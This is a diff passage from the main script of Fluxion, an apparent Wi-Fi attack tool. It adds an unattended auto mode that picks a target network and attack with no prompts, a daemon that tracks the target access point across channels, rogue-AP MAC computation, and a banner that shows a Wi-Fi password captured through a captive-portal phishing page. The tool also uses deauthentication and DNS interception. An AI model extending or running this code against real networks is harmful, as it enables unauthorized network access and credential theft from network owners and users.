+      emptyMessage+="${CYel}Please scan a different channel or delete existing handshakes.$CClr\n\n"
+    else
+      emptyMessage="${CRed}No networks found on this channel.$CClr\n\n"
+    fi
 
-  format_apply_autosize "$CRed[$CSYel ** $CClr$CRed]$CClr %-*.*s %4s %3s %3s %2s %-8.8s %18s\n"
+    local choices=("$FLUXIONGeneralBackOption")
+    io_query_choice "$emptyMessage" choices[@]
+    return 1
+  fi
+
+  format_center_literals "WIFI LIST"
+  local headerTitle="$FormatCenterLiterals\n\n"
+
+  # Add notice if networks were filtered
+  if [ $filteredCount -gt 0 ]; then
+    headerTitle+="${CBRed}Note: $filteredCount network(s) with existing handshakes were filtered$CClr\n\n"
+  fi
+
+  # Add DFS legend if any candidate is on a DFS channel
+  local __hasDFS=""
+  local __chk
+  for __chk in "${candidatesChannel[@]}"; do
+    if [[ "$__chk" == *"!" ]]; then __hasDFS=1; break; fi
+  done
+  if [ "$__hasDFS" ]; then
+    headerTitle+="${CYel}! = DFS channel (rogue AP may require a non-DFS fallback)$CClr\n\n"
+  fi
+
+  local __essidMaxLen=5
+  local __essidEntry
+  for __essidEntry in "${candidatesESSID[@]}"; do
+    [ ${#__essidEntry} -gt $__essidMaxLen ] && __essidMaxLen=${#__essidEntry}
+  done
+  local __vendorMaxLen=6
+  local __vendorEntry
+  for __vendorEntry in "${candidatesVendor[@]}"; do
+    [ ${#__vendorEntry} -gt $__vendorMaxLen ] && __vendorMaxLen=${#__vendorEntry}
+  done
+
   local -r headerFields=$(
-    printf "$FormatApplyAutosize" \
-      "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID"
+    printf "$CRed[$CSYel ** $CClr$CRed]$CClr %2s %-${__essidMaxLen}s %4s %3s %3s %4s %-8s %-17s %-${__vendorMaxLen}s\n" \
+      "HS" "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID" "VENDOR"
   )
 
-  format_apply_autosize "$CRed[$CSYel%03d$CClr$CRed]%b %-*.*s %3s%% %3s %3d %2s %-8.8s %18s\n"
-  io_query_format_fields "$headerTitle$headerFields" \
-   "$FormatApplyAutosize" \
-    candidatesColor[@] \
-    candidatesESSID[@] \
-    candidatesQuality[@] \
-    candidatesPower[@] \
-    candidatesClientsCount[@] \
-    candidatesChannel[@] \
-    candidatesSecurity[@] \
-    candidatesMAC[@]
+  local -r __dataFormat="$CRed[$CSYel%03d$CClr$CRed]%b  %2s %-${__essidMaxLen}.${__essidMaxLen}s %3s%% %3s %3d %4s %-8.8s %-17s %-${__vendorMaxLen}.${__vendorMaxLen}s\n"
+  FormatApplyAutosize="$__dataFormat"
 
-  echo
+  if [ "$FLUXIONAuto" ]; then
+    # Auto mode: select target matching -b/-e flags, or first available.
+    local autoTargetIndex=0
+    if [ "$FluxionTargetMAC" ] || [ "$FluxionTargetSSID" ]; then
+      local ti
+      for ti in "${!candidatesMAC[@]}"; do
+        if [ "$FluxionTargetMAC" ] && \
+          [ "${candidatesMAC[ti],,}" = "${FluxionTargetMAC,,}" ]; then
+          autoTargetIndex=$ti; break
+        fi
+        if [ "$FluxionTargetSSID" ] && \
+          [ "${candidatesESSID[ti]}" = "$FluxionTargetSSID" ]; then
+          autoTargetIndex=$ti; break
+        fi
+      done
+    fi
 
-  FluxionTargetMAC=${IOQueryFormatFields[7]}
-  FluxionTargetSSID=${IOQueryFormatFields[1]}
-  FluxionTargetChannel=${IOQueryFormatFields[5]}
+    FluxionTargetMAC=${candidatesMAC[$autoTargetIndex]}
+    FluxionTargetSSID=${candidatesESSID[$autoTargetIndex]}
+    FluxionTargetChannel=${candidatesChannel[$autoTargetIndex]//!/}
+  else
+    io_query_format_fields "$headerTitle$headerFields" \
+     "$FormatApplyAutosize" \
+      candidatesColor[@] \
+      candidatesHandshake[@] \
+      candidatesESSID[@] \
+      candidatesQuality[@] \
+      candidatesPower[@] \
+      candidatesClientsCount[@] \
+      candidatesChannel[@] \
+      candidatesSecurity[@] \
+      candidatesMAC[@] \
+      candidatesVendor[@]
 
-  FluxionTargetEncryption=${IOQueryFormatFields[6]}
+    echo
+
+    FluxionTargetMAC=${IOQueryFormatFields[8]}
+    FluxionTargetSSID=${IOQueryFormatFields[2]}
+    FluxionTargetChannel=${IOQueryFormatFields[6]//!/}
+  fi
+
+  if [ "$FLUXIONAuto" ]; then
+    FluxionTargetEncryption=${candidatesSecurity[$autoTargetIndex]}
+    FluxionTargetMaker=${candidatesVendor[$autoTargetIndex]}
+  else
+    FluxionTargetEncryption=${IOQueryFormatFields[7]}
+    # Get vendor from the selection (IOQueryFormatFields[9] is the vendor column)
+    FluxionTargetMaker=${IOQueryFormatFields[9]}
+  fi
+
+  # Cleanup airodump-ng output files after vendor lookup is complete
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
 
   FluxionTargetMakerID=${FluxionTargetMAC:0:8}
-  FluxionTargetMaker=$(
-    macchanger -l |
-    grep ${FluxionTargetMakerID,,} 2> $FLUXIONOutputDevice |
-    cut -d ' ' -f 5-
-  )
+  
+  # If vendor wasn't found in kismet/list, fallback to macchanger lookup
+  if [ -z "$FluxionTargetMaker" ]; then
+    FluxionTargetMaker=$(
+      macchanger -l |
+      grep ${FluxionTargetMakerID,,} 2> $FLUXIONOutputDevice |
+      cut -d ' ' -f 5-
+    )
+  fi
 
   FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)
 
@@ -1853,38 +1880,75 @@ fluxion_target_tracker_daemon() {
   readonly monitorTimeout=10 # In seconds.
   readonly capturePath="$FLUXIONWorkspacePath/tracker_capture"
 
+  echo "[T-Tracker] === DAEMON STARTED ===" > $FLUXIONOutputDevice
+  echo "[T-Tracker] Fluxion PID: $fluxionPID" > $FLUXIONOutputDevice
+  echo "[T-Tracker] Tracker Interface: $FluxionTargetTrackerInterface" > $FLUXIONOutputDevice
+  echo "[T-Tracker] Target MAC: $FluxionTargetMAC" > $FLUXIONOutputDevice
+  echo "[T-Tracker] Target SSID: $FluxionTargetSSID" > $FLUXIONOutputDevice
+  echo "[T-Tracker] Current Channel: $FluxionTargetChannel" > $FLUXIONOutputDevice
+
   if [ \
     -z "$FluxionTargetMAC" -o \
     -z "$FluxionTargetSSID" -o \
     -z "$FluxionTargetChannel" ]; then
+    echo "[T-Tracker] ERROR: Missing target info, aborting." > $FLUXIONOutputDevice
     return 2 # If we're missing target information, we can't track properly.
   fi
 
+  local apPresent=1 # 1 = AP visible, 0 = AP not visible.
+
   while true; do
-    echo "[T-Tracker] Captor listening for $monitorTimeout seconds..."
-    timeout --preserve-status $monitorTimeout airodump-ng -aw "$capturePath" \
-      -d "$FluxionTargetMAC" $FluxionTargetTrackerInterface &> /dev/null
+    echo "[T-Tracker] Scanning all channels for $monitorTimeout seconds..." > $FLUXIONOutputDevice
+    # Use --band abg to scan all 2.4GHz and 5GHz channels to detect channel hopping
+    # Redirect stdin from /dev/null to prevent SIGTTIN stopping the background process
+    timeout $monitorTimeout airodump-ng --band abg -aw "$capturePath" \
+      -d "$FluxionTargetMAC" $FluxionTargetTrackerInterface </dev/null &>/dev/null
     local error=$? # Catch the returned status error code.
 
-    if [ $error -ne 0 ]; then # If any error was encountered, abort!
-      echo -e "[T-Tracker] ${CRed}Error:$CClr Operation aborted (code: $error)!"
+    echo "[T-Tracker] airodump-ng exited with code: $error" > $FLUXIONOutputDevice
+
+    # Exit code 124 means timeout expired (expected), 143 means SIGTERM (also from timeout)
+    # Only abort on unexpected errors (not 0, 124, or 143)
+    if [ $error -ne 0 ] && [ $error -ne 124 ] && [ $error -ne 143 ]; then
+      echo -e "[T-Tracker] ${CRed}Error:$CClr Operation aborted (code: $error)!" > $FLUXIONOutputDevice
       break
     fi
 
-    local targetInfo=$(head -n 3 "$capturePath-01.csv" | tail -n 1)
+    local targetInfo=$(head -n 3 "$capturePath-01.csv" 2>/dev/null | tail -n 1)
     sandbox_remove_workfile "$capturePath-*"
 
     local targetChannel=$(
       echo "$targetInfo" | awk -F, '{gsub(/ /, "", $4); print $4}'
     )
 
-    echo "[T-Tracker] $targetInfo"
+    echo "[T-Tracker] Raw info: $targetInfo" > $FLUXIONOutputDevice
+    echo "[T-Tracker] Detected channel: '$targetChannel' (expected: '$FluxionTargetChannel')" > $FLUXIONOutputDevice
 
-    if [ "$targetChannel" -ne "$FluxionTargetChannel" ]; then
-      echo "[T-Tracker] Target channel change detected!"
+    # Detect presence/absence transitions and signal the parent.
+    if [ -z "$targetChannel" ] || [ "$targetChannel" = "-1" ]; then
+      echo "[T-Tracker] Target not found or channel invalid, retrying..." > $FLUXIONOutputDevice
+      if [ $apPresent -ne 0 ]; then
+        apPresent=0
+        echo "[T-Tracker] AP disappeared — signalling pause." > $FLUXIONOutputDevice
+        kill -SIGUSR1 $fluxionPID 2>/dev/null
+      fi
+      continue
+    fi
+
+    # AP is visible — signal resume if it was previously absent.
+    if [ $apPresent -eq 0 ]; then
+      apPresent=1
+      echo "[T-Tracker] AP reappeared — signalling resume." > $FLUXIONOutputDevice
+      kill -SIGUSR2 $fluxionPID 2>/dev/null
+    fi
+
+    if [ "$targetChannel" -ne "$FluxionTargetChannel" ] 2>/dev/null; then
+      echo "[T-Tracker] !!! CHANNEL CHANGE DETECTED: $FluxionTargetChannel -> $targetChannel !!!" > $FLUXIONOutputDevice
       FluxionTargetChannel=$targetChannel
       break
     fi
+
+    echo "[T-Tracker] Channel unchanged, continuing to monitor..." > $FLUXIONOutputDevice
 
     # NOTE: We might also want to check for SSID changes here, assuming the only
     # thing that remains constant is the MAC address. The problem with that is
@@ -1911,9 +1975,11 @@ fluxion_target_tracker_stop() {
 }
 
 fluxion_target_tracker_start() {
-  if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi
+  if [ ! "$FluxionTargetTrackerInterface" ]; then
+    return 1
+  fi
 
-  fluxion_target_tracker_daemon $$ &> "$FLUXIONOutputDevice" &
+  fluxion_target_tracker_daemon $$ &> $FLUXIONOutputDevice &
   FluxionTargetTrackerDaemonPID=$!
 }
 
@@ -1937,13 +2003,23 @@ fluxion_target_set_tracker() {
 
   if [ "$FluxionTargetTrackerInterface" == "" ]; then
     echo "Running get interface (tracker)." > $FLUXIONOutputDevice
-    local -r interfaceQuery=$FLUXIONTargetTrackerInterfaceQuery
-    local -r interfaceQueryTip=$FLUXIONTargetTrackerInterfaceQueryTip
-    local -r interfaceQueryTip2=$FLUXIONTargetTrackerInterfaceQueryTip2
-    if ! fluxion_get_interface attack_tracking_interfaces \
-      "$interfaceQuery\n$FLUXIONVLine $interfaceQueryTip\n$FLUXIONVLine $interfaceQueryTip2"; then
-      echo "Failed to get tracker interface!" > $FLUXIONOutputDevice
-      return 2
+    if [ "$FLUXIONAuto" ]; then
+      if [ "$FLUXIONTrackerInterface" ]; then
+        FluxionInterfaceSelected="$FLUXIONTrackerInterface"
+      else
+        # Auto mode: skip tracker unless --tracker-interface is specified.
+        FluxionTargetTrackerInterface=""
+        return 0
+      fi
+    else
+      local -r interfaceQuery=$FLUXIONTargetTrackerInterfaceQuery
+      local -r interfaceQueryTip=$FLUXIONTargetTrackerInterfaceQueryTip
+      local -r interfaceQueryTip2=$FLUXIONTargetTrackerInterfaceQueryTip2
+      if ! fluxion_get_interface attack_tracking_interfaces \
+        "$interfaceQuery\n$FLUXIONVLine $interfaceQueryTip\n$FLUXIONVLine $interfaceQueryTip2"; then
+        echo "Failed to get tracker interface!" > $FLUXIONOutputDevice
+        return 2
+      fi
     fi
     local selectedInterface=$FluxionInterfaceSelected
   else
@@ -1965,7 +2041,18 @@ fluxion_target_set_tracker() {
   fi
 
   echo "Successfully got tracker interface." > $FLUXIONOutputDevice
-  FluxionTargetTrackerInterface=${FluxionInterfaces[$selectedInterface]}
+  echo "selectedInterface='$selectedInterface'" >> $FLUXIONOutputDevice
+  echo "FluxionInterfaces[$selectedInterface]='${FluxionInterfaces[$selectedInterface]}'" >> $FLUXIONOutputDevice
+
+  # Use the selected interface directly if it exists, otherwise lookup in hash
+  if interface_is_real "$selectedInterface"; then
+    echo "interface_is_real returned true, using direct" >> $FLUXIONOutputDevice
+    FluxionTargetTrackerInterface="$selectedInterface"
+  else
+    echo "interface_is_real returned false, using hash lookup" >> $FLUXIONOutputDevice
+    FluxionTargetTrackerInterface=${FluxionInterfaces[$selectedInterface]}
+  fi
+  echo "Final FluxionTargetTrackerInterface='$FluxionTargetTrackerInterface'" >> $FLUXIONOutputDevice
 }
 
 fluxion_target_unset() {
@@ -1986,10 +2073,13 @@ fluxion_target_unset() {
 }
 
 fluxion_target_set() {
+  echo ">>> fluxion_target_set called" >> "$FLUXIONOutputDevice"
   # Check if attack is targetted & set the attack target if so.
   if ! type -t attack_targetting_interfaces &> /dev/null; then
+    echo ">>> attack_targetting_interfaces not found" >> "$FLUXIONOutputDevice"
     return 1
   fi
+  echo ">>> attack_targetting_interfaces found" >> "$FLUXIONOutputDevice"
 
   if [ \
     "$FluxionTargetSSID" -a \
@@ -1997,6 +2087,18 @@ fluxion_target_set() {
     "$FluxionTargetChannel" \
   ]; then
     # If we've got a candidate target, ask user if we'll keep targetting it.
+
+    # Ensure rogue MAC is always computed when we have a valid target.
+    # fluxion_get_target normally computes this, but early returns bypass it.
+    if [ -z "$FluxionTargetRogueMAC" ]; then
+      local _rogueHex
+      _rogueHex=$(printf %02X $((0x${FluxionTargetMAC:13:1} + 1)))
+      FluxionTargetRogueMAC="${FluxionTargetMAC::13}${_rogueHex:1:1}${FluxionTargetMAC:14:4}"
+    fi
+
+    if [ "$FLUXIONAuto" ]; then
+      return 0
+    fi
 
     fluxion_header
     fluxion_target_show
@@ -2028,69 +2130,27 @@ fluxion_target_set() {
     sleep 3
   fi
 
-  # Ask user if they want single or multi-interface scanning
-  fluxion_header
-  echo -e "$FLUXIONVLine Select interface mode for target scanning"
-  echo
+  echo "Starting fluxion_get_interface for targetting" >> $FLUXIONOutputDevice
+  if ! fluxion_get_interface attack_targetting_interfaces \
+    "$FLUXIONTargetSearchingInterfaceQuery"; then
+    echo "fluxion_get_interface failed for targetting" >> $FLUXIONOutputDevice
+    return 2
+  fi
+  if ! fluxion_allocate_interface $FluxionInterfaceSelected; then
+    return 3
+  fi
 
-  local scan_mode_choices=(
-    "Single interface (traditional)"
-    "Multiple interfaces (parallel scan)"
-    "$FLUXIONGeneralBackOption"
-  )
+  # Use the selected interface directly if it exists, otherwise lookup in hash
+  local targetInterface
+  if interface_is_real "$FluxionInterfaceSelected"; then
+    targetInterface="$FluxionInterfaceSelected"
+  else
+    targetInterface="${FluxionInterfaces[$FluxionInterfaceSelected]}"
+  fi
 
-  io_query_choice "" scan_mode_choices[@]
-  echo
-
-  case "$IOQueryChoice" in
-    "Single interface (traditional)")
-      if ! fluxion_get_interface attack_targetting_interfaces \
-        "$FLUXIONTargetSearchingInterfaceQuery"; then
-        return 2
-      fi
-
-      if ! fluxion_allocate_interface $FluxionInterfaceSelected; then
-        return 3
-      fi
-
-      if ! fluxion_get_target \
-        ${FluxionInterfaces[$FluxionInterfaceSelected]}; then
-        return 4
-      fi
-      ;;
-
-    "Multiple interfaces (parallel scan)")
-      if ! fluxion_get_interfaces_multi attack_targetting_interfaces \
-        "$FLUXIONTargetSearchingInterfaceQuery"; then
-        return 2
-      fi
-
-      if [ ${#FluxionInterfacesSelected[@]} -eq 0 ]; then
-        echo -e "$FLUXIONVLine ${CRed}No interfaces selected$CClr"
-        sleep 2
-        return 3
-      fi
-
-      # Allocate all selected interfaces
-      local allocated_interfaces=()
-      for iface in "${FluxionInterfacesSelected[@]}"; do
-        if ! fluxion_allocate_interface "$iface"; then
-          echo -e "$FLUXIONVLine ${CRed}Failed to allocate $iface$CClr"
-          sleep 2
-          return 3
-        fi
-        allocated_interfaces+=("${FluxionInterfaces[$iface]}")
-      done
-
-      # Use multi-interface scanning with all allocated interfaces
-      if ! fluxion_get_target_multi "${allocated_interfaces[@]}"; then
-        return 4
-      fi
-      ;;
-
-    "$FLUXIONGeneralBackOption")
-      return -1;;
-  esac
+  if ! fluxion_get_target "$targetInterface"; then
+    return 4
+  fi
 }
 
 
@@ -2099,7 +2159,23 @@ fluxion_target_set() {
 fluxion_hash_verify() {
   if [ ${#@} -lt 3 ]; then return 1; fi
 
-  local -r hashPath=$1
+  local hashPath=$1
+
+  # If no valid default path was passed, try to locate a handshake by BSSID.
+  if [ ! "$hashPath" -o ! -s "$hashPath" ]; then
+    local -r handshakeDir="$FLUXIONPath/attacks/Handshake Snooper/handshakes"
+    if [ -d "$handshakeDir" ]; then
+      local -r bssid_search="${2:-$FluxionTargetMAC}"
+      local found_hash
+      found_hash=$(ls "$handshakeDir"/*"${bssid_search^^}".cap 2>/dev/null | head -n1)
+      if [ ! "$found_hash" ]; then
+        found_hash=$(ls "$handshakeDir"/*"${bssid_search,,}".cap 2>/dev/null | head -n1)
+      fi
+      if [ "$found_hash" ]; then
+        hashPath="$found_hash"
+      fi
+    fi
+  fi
   local -r hashBSSID=$2
   local -r hashESSID=$3
   local -r hashChannel=$4
@@ -2229,6 +2305,12 @@ fluxion_hash_set_path() {
     fi
   fi
 
+  if [ "$FLUXIONAuto" ]; then
+    # Auto mode: no hash path available, can't prompt user.
+    echo "Auto mode: no hash file available." > $FLUXIONOutputDevice
+    return 1
+  fi
+
   while [ ! "$FluxionHashPath" ]; do
     fluxion_header
 
@@ -2261,7 +2343,28 @@ fluxion_hash_get_path() {
 
   while true; do
     fluxion_hash_unset_path
-    if ! fluxion_hash_set_path "$@"; then
+    fluxion_hash_set_path "$@"
+    local hash_set_result=$?
+
+    # Handle user navigation separately from real errors.
+    if [ $hash_set_result -ne 0 ]; then
+      # 1  -> user hit enter on an empty path; keep looping so any
+      #       previously found/default hash can be offered again.
+      #       BUT if no valid default hash exists, allow going back.
+      # 255-> user selected the explicit Back option; bubble up.
+      if [ $hash_set_result -eq 1 ]; then
+        # Only continue looping if a valid default hash file exists
+        if [ -n "$1" ] && [ -f "$1" ] && [ -s "$1" ]; then
+          continue  # Valid default hash exists, loop to offer it again
+        else
+          return -1  # No valid default hash, allow user to go back
+        fi
+      fi
+
+      if [ $hash_set_result -eq 255 ]; then
+        return -1
+      fi
+
       echo "Failed to set hash path." > $FLUXIONOutputDevice
       return -1 # WARNING: The recent error code is NOT contained in $? here!
     else
@@ -2279,7 +2382,7 @@ fluxion_hash_get_path() {
 
 # ================== < Attack Subroutines > ================== #
 fluxion_unset_attack() {
-   local -r attackWasSet=${FluxionAttack:+1}
+  local -r attackWasSet=${FluxionAttack:+1}
   FluxionAttack=""
   if [ ! "$attackWasSet" ]; then return 1; fi
 }
@@ -2289,15 +2392,22 @@ fluxion_set_attack() {
 
   fluxion_unset_attack
 
+  local attacks
+  readarray -t attacks < <(ls -1 "$FLUXIONPath/attacks")
+
+  if [ "$FLUXIONAuto" ]; then
+    # Auto mode: use -a flag match or first attack.
+    FluxionAttack="${attacks[0]}"
+    echo "Auto-selected attack: $FluxionAttack" >> "$FLUXIONOutputDevice"
+    return 0
+  fi
+
   fluxion_header
 
   echo -e "$FLUXIONVLine $FLUXIONAttackQuery"
   echo
 
   fluxion_target_show
-
-  local attacks
-  readarray -t attacks < <(ls -1 "$FLUXIONPath/attacks")
 
   local descriptions
   readarray -t descriptions < <(
@@ -2340,6 +2450,8 @@ fluxion_set_attack() {
 
 
   FluxionAttack=${IOQueryFormatFields[0]}
+  echo "Selected attack: $FluxionAttack" >> "$FLUXIONOutputDevice"
+  return 0
 }
 
 fluxion_unprep_attack() {
@@ -2385,28 +2497,44 @@ fluxion_prep_attack() {
 
   # Check if attack is targetted & set the attack target if so.
   if type -t attack_targetting_interfaces &> /dev/null; then
-    if ! fluxion_target_set; then return 3; fi
+    echo "Calling fluxion_target_set" >> "$FLUXIONOutputDevice"
+    if ! fluxion_target_set; then 
+      echo "fluxion_target_set FAILED" >> "$FLUXIONOutputDevice"
+      return 3
+    fi
+    echo "fluxion_target_set SUCCESS" >> "$FLUXIONOutputDevice"
   fi
 
   # Check if attack provides tracking interfaces, get & set one.
   # TODO: Uncomment the lines below after implementation.
+  echo "Checking for attack_tracking_interfaces" >> "$FLUXIONOutputDevice"
   if type -t attack_tracking_interfaces &> /dev/null; then
-    if ! fluxion_target_set_tracker; then return 4; fi
+    echo "Calling fluxion_target_set_tracker" >> "$FLUXIONOutputDevice"
+    if ! fluxion_target_set_tracker; then 
+      echo "fluxion_target_set_tracker FAILED" >> "$FLUXIONOutputDevice"
+      return 4
+    fi
+    echo "fluxion_target_set_tracker SUCCESS" >> "$FLUXIONOutputDevice"
   fi
 
   # If attack is capable of restoration, check for configuration.
   if type -t load_attack &> /dev/null; then
     # If configuration file available, check if user wants to restore.
     if [ -f "$path/attack.conf" ]; then
-      local choices=( \
-        "$FLUXIONAttackRestoreOption" \
-        "$FLUXIONAttackResetOption" \
-      )
+      if [ "$FLUXIONAuto" ]; then
+        # Auto mode: skip restore, reset fresh.
+        echo "Auto mode: skipping attack config restore." > $FLUXIONOutputDevice
+      else
+        local choices=( \
+          "$FLUXIONAttackRestoreOption" \
+          "$FLUXIONAttackResetOption" \
+        )
 
-      io_query_choice "$FLUXIONAttackResumeQuery" choices[@]
+        io_query_choice "$FLUXIONAttackResumeQuery" choices[@]
 
-      if [ "$IOQueryChoice" = "$FLUXIONAttackRestoreOption" ]; then
-        load_attack "$path/attack.conf"
+        if [ "$IOQueryChoice" = "$FLUXIONAttackRestoreOption" ]; then
+          load_attack "$path/attack.conf"
+        fi
       fi
     fi
   fi
@@ -2420,18 +2548,136 @@ fluxion_prep_attack() {
 }
 
 fluxion_run_attack() {
+  # Remove stale completion signals left by a previous run so the auto-mode
+  # watcher does not immediately exit on a fresh attack cycle.
+  rm -f "$FLUXIONWorkspacePath/status.txt" \
+        "$FLUXIONWorkspacePath/authenticator_success.flag" \
+        "$FLUXIONWorkspacePath/handshake_success.flag" \
+        2>/dev/null
+
   start_attack
   fluxion_target_tracker_start
 
-  local choices=( \
-    "$FLUXIONSelectAnotherAttackOption" \
-    "$FLUXIONGeneralExitOption" \
-  )
+  if [ "$FLUXIONAuto" ]; then
+    # Auto mode: poll for attack self-termination (e.g., handshake captured,
+    # password found) by checking for status.txt or success flags.
+    echo "Auto mode: waiting for attack to complete..." > $FLUXIONOutputDevice
+    # Snapshot the arbiter PID now — the SIGABRT trap calls stop_attack which
+    # clears HandshakeSnooperArbiterPID, so we need our own copy to track it.
+    local autoArbiterPID="$HandshakeSnooperArbiterPID"
+    local autoTimeout=0
+    local autoMaxWait=0  # 0 = infinite (no timeout)
+    if [ "$FLUXIONTimeout" ]; then
+      autoMaxWait=$((FLUXIONTimeout * 60))
+    fi
+    while [ $autoMaxWait -eq 0 ] || [ $autoTimeout -lt $autoMaxWait ]; do
+      # Check if attack finished (captive portal writes status.txt on success)
+      if [ -f "$FLUXIONWorkspacePath/status.txt" ]; then
+        echo "Auto mode: attack completed (status file found)." > $FLUXIONOutputDevice
+        break
+      fi
+      # Check if handshake was captured
+      if [ -f "$FLUXIONWorkspacePath/authenticator_success.flag" ]; then
+        echo "Auto mode: attack completed (success flag found)." > $FLUXIONOutputDevice
+        break
+      fi
+      # Check if arbiter daemon completed (handshake snooper).
+      # Use the snapshotted PID — HandshakeSnooperArbiterPID may be cleared by
+      # the SIGABRT trap before we get to check it.
+      if [ "$autoArbiterPID" ] && ! kill -0 "$autoArbiterPID" 2>/dev/null; then
+        echo "Auto mode: arbiter daemon exited." > $FLUXIONOutputDevice
+        break
+      fi
+      sleep 5
+      autoTimeout=$((autoTimeout + 5))
+    done
 
-  io_query_choice \
-    "$(io_dynamic_output $FLUXIONAttackInProgressNotice)" choices[@]
+    if [ $autoMaxWait -gt 0 ] && [ $autoTimeout -ge $autoMaxWait ]; then
+      echo "Auto mode: timeout reached (${FLUXIONTimeout}m), stopping attack." > $FLUXIONOutputDevice
+    fi
+  else
+    local choices=( \
+      "$FLUXIONSelectAnotherAttackOption" \
+      "$FLUXIONGeneralExitOption" \
+    )
 
-  echo
+    # Display the attack-in-progress menu once (same layout as io_query_choice).
+    fluxion_header
+    echo -e "$FLUXIONVLine $(io_dynamic_output $FLUXIONAttackInProgressNotice)"
+    echo
+    local _ci=1
+    for _c in "${choices[@]}"; do
+      echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
+      _ci=$((_ci + 1))
+    done
+    echo
+    echo -ne "$IOUtilsPrompt"
+
+    # Poll for attack self-completion every second using read -t 1.
+    # This keeps us in normal code flow (no signal tricks) so that the
+    # success display in fluxion_handle_exit works as a plain function call.
+    local _attackSucceeded=0
+    local _handshakeNotified=0
+    local _captiveNotified=0
+    while true; do
+      # Handshake Snooper: arbiter daemon writes this flag on success.
+      # Redraw once with a success notice; then keep waiting for the user
+      # to choose the next step (another attack or exit).
+      if [ $_handshakeNotified -eq 0 ] && \
+         [ -f "$FLUXIONWorkspacePath/handshake_success.flag" ]; then
+        _handshakeNotified=1
+        rm -f "$FLUXIONWorkspacePath/handshake_success.flag"
+        fluxion_header
+        echo -e "$FLUXIONVLine $HandshakeSnooperArbiterSuccededNotice"
+        echo
+        _ci=1
+        for _c in "${choices[@]}"; do
+          echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
+          _ci=$((_ci + 1))
+        done
+        echo
+        echo -ne "$IOUtilsPrompt"
+      fi
+      # Captive Portal: authenticator writes status.txt when credentials are
+      # verified. Stop all attack services immediately (rogue AP, DNS, DHCP,
+      # web server, deauth jammer), then redraw showing the credentials and
+      # wait for the user to choose the next step.
+      if [ $_captiveNotified -eq 0 ] && \
+         [ -f "$FLUXIONWorkspacePath/status.txt" ]; then
+        _captiveNotified=1
+        fluxion_target_tracker_stop
+        stop_attack
+        local _captivePwd
+        _captivePwd=$(cat "$FLUXIONWorkspacePath/candidate.txt" 2>/dev/null)
+        fluxion_header
+        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+        echo -e "  ${CSGrn}|           ATTACK SUCCESSFUL                   |${CClr}"
+        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+        echo -e "  ${CGrn}  Network  :${CClr} ${CSWht}$FluxionTargetSSID${CClr}"
+        echo -e "  ${CGrn}  BSSID    :${CClr} ${CSWht}$FluxionTargetMAC${CClr}"
+        echo -e "  ${CYel}  Password :${CClr} ${CSYel}$_captivePwd${CClr}"
+        echo -e "  ${CSGrn}+-----------------------------------------------+${CClr}"
+        echo
+        _ci=1
+        for _c in "${choices[@]}"; do
+          echo -e "\t${CRed}[${CSYel}${_ci}${CClr}${CRed}]${CClr} ${_c}${CClr}"
+          _ci=$((_ci + 1))
+        done
+        echo
+        echo -ne "$IOUtilsPrompt"
+      fi
+      local _inp=""
+      if read -t 1 -r _inp 2>/dev/null && [ -n "$_inp" ]; then
+        if [ "$_inp" = "1" ]; then
+          IOQueryChoice="${choices[0]}"; break
+        elif [ "$_inp" = "2" ]; then
+          IOQueryChoice="${choices[1]}"; break
+        fi
+      fi
+    done
+
+    echo
+  fi
 
   # IOQueryChoice is a global, meaning, its value is volatile.
   # We need to make sure to save the choice before it changes.
@@ -2440,23 +2686,15 @@ fluxion_run_attack() {
   fluxion_target_tracker_stop
 
 
-  # could execute twice
-  # but mostly doesn't matter
-  if [ ! -x "$(command -v systemctl)" ]; then
-    if [ "$(systemctl list-units | grep systemd-resolved)" != "" ];then
-        systemctl restart systemd-resolved.service
-    fi
-  fi
-
-  if [ -x "$(command -v service)" ];then
-    if service --status-all | grep -Fq 'systemd-resolved'; then
-      sudo service systemd-resolved.service restart
-    fi
+  # Restore systemd-resolved DNS after the attack intercepted DNS traffic.
+  # Run in background with a timeout so it never blocks the exit path.
+  if command -v systemctl &>/dev/null; then
+    timeout 5 systemctl try-restart systemd-resolved.service &>/dev/null &
   fi
 
   stop_attack
 
-  if [ "$choice" = "$FLUXIONGeneralExitOption" ]; then
+  if [ "$FLUXIONAuto" ] || [ "$choice" = "$FLUXIONGeneralExitOption" ]; then
     fluxion_handle_exit
   fi
 
@@ -2476,9 +2714,216 @@ while [ "$1" != "" -a "$1" != "--" ]; do
 done
 
 # ============================================================ #
+# ============== < List Interfaces Mode > =================== #
+# ============================================================ #
+if [ "$FLUXIONListInterfaces" ]; then
+  interface_list_wireless
+  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
+    echo "No wireless interfaces detected."
+    exit 1
+  fi
+  printf "%-16s %-8s %-16s %-8s %-12s %s\n" "INTERFACE" "STATE" "BANDS" "BUS" "DRIVER" "CHIPSET"
+  for iface in "${InterfaceListWireless[@]}"; do
+    interface_chipset "$iface" 2>/dev/null
+    interface_driver "$iface" 2>/dev/null
+    interface_state "$iface" 2>/dev/null
+    interface_bands "$iface" 2>/dev/null
+    printf "%-16s %-8s %-16s %-8s %-12s %s\n" \
+      "$iface" \
+      "${InterfaceState:-unknown}" \
+      "${InterfaceBands:-unknown}" \
+      "${InterfaceHardwareBus:-unknown}" \
+      "${InterfaceDriver:-unknown}" \
+      "${InterfaceChipset:-unknown}"
+  done
+  exit 0
+fi
+
+# ============================================================ #
+# ================= < Scan-Only Mode > ====================== #
+# ============================================================ #
+fluxion_scan_only() {
+  # Minimal startup: skip banner/update, just check deps.
+  if [ ! "$FLUXIONDebug" ]; then
+    iptables-save >"$FLUXIONIPTablesBackup" 2>/dev/null
+  fi
+
+  fluxion_set_resolution
+
+  # Set language for scanner strings.
+  FluxionLanguage="${FluxionLanguage:-en}"
+  source "$FLUXIONPath/language/$FluxionLanguage.sh"
+
+  # Get wireless interface: use --interface if specified, otherwise first available.
+  interface_list_wireless
+  if [ ${#InterfaceListWireless[@]} -eq 0 ]; then
